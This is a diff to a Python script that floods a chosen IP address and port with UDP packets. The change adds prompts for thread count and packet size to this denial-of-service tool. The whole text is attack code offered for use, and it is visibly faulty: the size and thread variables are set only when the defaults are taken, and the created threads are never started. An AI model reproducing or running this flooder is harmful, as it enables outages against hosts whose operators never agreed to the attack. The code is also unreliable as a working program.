@@ -48,9 +48,19 @@ print("""
 
 ip = input("[+} Target IP: ")
 print(" <+> This is the target IP " + ip + ' <+> ')
-time.sleep(1)
-port = int(input("[+} Target open port: "))
-print(port)
+port = input("[+} Target open port: ")
+print(' <+> Open port is ' + port + ' <+> ')
+porti = int(port)
+th = input("[+} Enter the threads (defalt 200) : ")
+if th == '':
+    th = str('200')
+    print(' <+> Threads are ' + th + ' <+> ')
+    thi = int(th)
+by = input('[+} Enter bytes (defalt max: 65501): ')
+if by == '':
+    by = str('65501')
+    print(' <+> Bytes are ' + by + ' <+> ')
+    byi = int(by)
 time.sleep(1)
 
 print("""
@@ -69,25 +79,17 @@ print("""
 
 """)
 
-
 def dos(packet):
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    print(" <+> 68 MB per second (1000 packets per second) / you can change this! / 65501 bytes per packet <+> ")
-    time.sleep(2)
-    print(' <+> 100 threads are attacking! <+> ')
-    time.sleep(2)
     x = 0
     sent = 0
     while True:
-        client.sendto(packet, (ip, port))
-        x += 65501
+        client.sendto(packet, (ip, porti))
+        x += byi
         sent += 1
-        txt = " <> Sended {} packets, bytes sended {} to {} : {} <> "
-        print(txt.format(sent, x, ip, port))
+        txt = " <-> Sended {} packets, bytes sended {} to {} : {} <-> "
+        print(txt.format(sent, x, ip, porti))
 
-
-# max range 10000 for pc or there is a chance your device to crash.
-# max range 200 for phones or your device will crach.
-for i in range(100):
+for i in range(thi):
     threading.Thread(target=dos)
-dos(bytearray(65501))
+dos(bytearray(byi))
